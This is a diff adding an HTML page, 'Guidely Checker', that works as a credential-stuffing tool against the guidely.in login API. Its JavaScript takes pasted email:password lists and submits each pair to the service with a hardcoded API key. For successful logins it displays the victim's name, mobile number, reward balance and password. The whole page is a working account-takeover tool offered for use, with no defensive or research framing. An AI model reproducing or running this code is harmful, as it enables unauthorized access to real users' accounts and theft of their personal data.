@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Guidely Checker</title>
+  <link rel="canonical" href="https://uncoder.eu.org" />
+  <meta name="robots" content="index, follow" />
+  <meta name="author" content="OshekharO" />
+  <meta name="copyright" content="Copyright © 2024 OshekharO" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <style>
+   body {
+    font-size: 14px;
+    line-height: 1.6;
+    color: #616370;
+    background: #26272c;
+    height: 100%;
+    position: relative;
+    margin: 1.5rem;
+   }
+   .footer {
+    font-family: "Courier New", Courier, monospace;
+    margin-top: 40px;
+    font-size:14px;
+    text-align:center;
+   }
+   .footer a {
+    color: white;
+   }
+  </style>
+ </head>
+ <body class="bg-dark text-light">
+  <div class="container py-2">
+   <h1 class="text-center mb-5">Guidely Checker</h1>
+   <form id="form">
+    <div class="form-group">
+     <label for="email-password-input" class="fs-6 font-monospace badge bg-danger mb-2">Email:Password</label>
+     <textarea class="form-control" id="email-password-input" rows="10" placeholder="example@mail.com:example5230"></textarea>
+    </div>
+    <div class="d-grid gap-2 d-md-flex justify-content-md-center mt-3">
+     <button type="button" onclick="checkEmails()" class="btn btn-outline-success">START</button>
+     <button type="button" id="stop" class="btn btn-outline-danger" disabled>STOP</button>
+    </div>
+    <div class="alert alert-success mt-3" id="valid-emails">
+     <h3 class="font-monospace">Valid - <span id="valid-count" class="badge bg-success">0</span></h3>
+     <div id="valid-results"></div>
+    </div>
+    <div class="alert alert-danger mt-3" id="invalid-emails">
+     <h3 class="font-monospace">Invalid - <span id="invalid-count" class="badge bg-danger">0</span></h3>
+     <div id="invalid-results"></div>
+    </div>
+   </form>
+   <div class="footer"><span id="classic">Made With Love By <a href="https://uncoder.eu.org" title="copyright" target="_blank">OshekharO</a></span></div>
+  </div>
+  <script>
+   function checkEmail(email, password) {
+    const apiKey = "qw42yunk";
+    const url = `https://web.guidely.in/api/v1/login?apikey=${apiKey}`;
+    const headers = {
+     "Content-Type": "application/json",
+     "Accept": "application/json",
+    };
+    const body = {
+     email,
+     password,
+     signup_type: 1,
+     register_url: "https://guidely.in/",
+     app_type: "web",
+     features: 1,
+    };
+
+    return fetch(url, { method: "POST", headers, body: JSON.stringify(body) })
+     .then((response) => response.json())
+     .then((data) => {
+      if (data.error) {
+       return { status: 401, data };
+      } else {
+       return { status: 200, data };
+      }
+     })
+     .catch((error) => {
+      return { status: 401, data: error.message };
+     });
+   }
+
+   function checkEmails() {
+    let emailPasswordCombinations = document.getElementById("email-password-input").value.split("\n");
+    const validElement = document.getElementById("valid-results");
+    const invalidElement = document.getElementById("invalid-results");
+    validElement.textContent = "";
+    invalidElement.textContent = "";
+
+    emailPasswordCombinations.forEach((combination) => {
+     const [email, password] = combination.trim().split(":");
+
+     if (!email || !password) {
+      document.getElementById("invalid-count").textContent = Number(document.getElementById("invalid-count").textContent) + 1;
+      invalidElement.textContent += `Invalid format: ${combination}<br>`;
+      return;
+     }
+
+     checkEmail(email, password)
+      .then((response) => {
+       if (response.data.status === 2) {
+        validElement.innerHTML += `<p>Name: ${response.data.data.candidate.name}<br>
+                             Email: ${email}<br>
+                             Password: ${password}<br>
+                             Mobile: ${response.data.data.candidate.mobile}<br>
+                             Reward: ${response.data.data.candidate.reward}</p>`;
+        document.getElementById("valid-count").textContent = Number(document.getElementById("valid-count").textContent) + 1;
+       } else {
+        document.getElementById("invalid-count").textContent = Number(document.getElementById("invalid-count").textContent) + 1;
+        invalidElement.innerHTML += `<p>Email: ${email}<br>
+                              Password: ${password}<br>
+                              Error: ${response.data.message || response.data}</p>`;
+       }
+      })
+      .catch((error) => {
+       document.getElementById("invalid-count").textContent = Number(document.getElementById("invalid-count").textContent) + 1;
+       invalidElement.textContent += `Email: ${email}, Password: ${password} - Error: ${response.data.error.message}<br>`;
+      });
+    });
+   }
+  </script>
+ </body>
+</html>
